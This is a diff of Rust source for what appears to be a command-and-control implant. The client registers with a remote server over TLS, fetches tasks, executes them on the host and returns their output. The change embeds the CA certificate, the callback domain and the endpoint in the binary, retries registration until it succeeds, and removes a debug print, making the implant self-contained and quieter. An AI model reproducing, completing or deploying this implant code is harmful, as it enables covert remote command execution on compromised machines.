@@ -1,24 +1,25 @@
 mod exec;
+mod pb;
+mod rpc;
+mod embed;
 
-use std::error::Error;
-
-use exec::implantpb::implant_rpc_client::ImplantRpcClient;
-use exec::implantpb::{Registration, TaskRequest, TaskResult};
-use tonic::transport::{Certificate, Channel, ClientTlsConfig};
+use pb::{Registration, TaskRequest, TaskResult};
 
 #[tokio::main]
 async fn main() {
-    let mut client = make_client().await.unwrap();
+    let root_ca = embed::Certs::get("rootCA.pem").unwrap();
+    let root_ca = std::str::from_utf8(root_ca.data.as_ref()).unwrap();
+    let mut client = rpc::new_client(root_ca, embed::DOMAIN_NAME, embed::ENDPOINT).await.unwrap();
 
-    let request = tonic::Request::new(Registration {
-        implant_id: "".to_string(),
-    });
-    let implant_id = client
-        .register(request)
-        .await
-        .unwrap()
-        .into_inner()
-        .implant_id;
+    let implant_id = loop {
+        let request = tonic::Request::new(Registration {
+            implant_id: "".to_string(),
+        });
+        match client.register(request).await {
+            Ok(response) => break response.into_inner().implant_id,
+            Err(_) => std::thread::sleep(std::time::Duration::from_secs(5))
+        }
+    };
 
     loop {
         let request = tonic::Request::new(TaskRequest {
@@ -27,7 +28,6 @@ async fn main() {
 
         match client.get_task(request).await {
             Ok(response) => {
-                println!("{:?}", response);
                 let response = response.into_inner();
                 if let Some((stdout, stderr)) = exec::exec_task(&response) {
                     let request = tonic::Request::new(TaskResult {
@@ -41,26 +41,6 @@ async fn main() {
             Err(e) => eprintln!("{:?}", e),
         }
 
-        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
+        std::thread::sleep(std::time::Duration::from_secs(5));
     }
-}
-
-async fn make_client() -> Result<ImplantRpcClient<Channel>, Box<dyn Error>> {
-    // TODO: Don't use a hardcoded ca cert
-    let pem = tokio::fs::read("../certs/ca.pem").await?;
-    let ca = Certificate::from_pem(pem);
-
-    // TODO: Don't use a hardcoded domain name
-    let tls = ClientTlsConfig::new()
-        .ca_certificate(ca)
-        .domain_name("ZHJvcGxldHNlcnZlciAK.YzIK");
-
-    // TODO: Don't use a hardcoded IP address
-    let channel = Channel::from_static("https://127.0.0.1:9001")
-        .tls_config(tls)?
-        .connect()
-        .await?;
-
-    let client = ImplantRpcClient::new(channel);
-    Ok(client)
 }
